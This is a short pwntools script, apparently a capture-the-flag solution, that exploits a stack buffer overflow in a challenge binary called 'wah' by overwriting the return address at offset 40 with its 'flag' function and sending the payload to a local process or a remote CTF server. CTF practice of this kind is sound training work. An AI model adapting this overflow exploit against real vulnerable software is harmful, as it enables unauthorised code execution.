#!/usr/bin/env python3
#ret2win

from pwn import *

exe = ELF('wah')

context.binary = exe
context.log_level='debug'

offset = 40

def conn():
    if args.REMOTE:
        io = remote("challs.actf.co", 31224)
    else:
        io = process(exe.path)
        if args.DEBUG:
            gdb.attach(io)

    return io

payload = flat({
    offset:[exe.functions.flag]
    })

io = conn()
io.sendline(payload)
io.interactive()
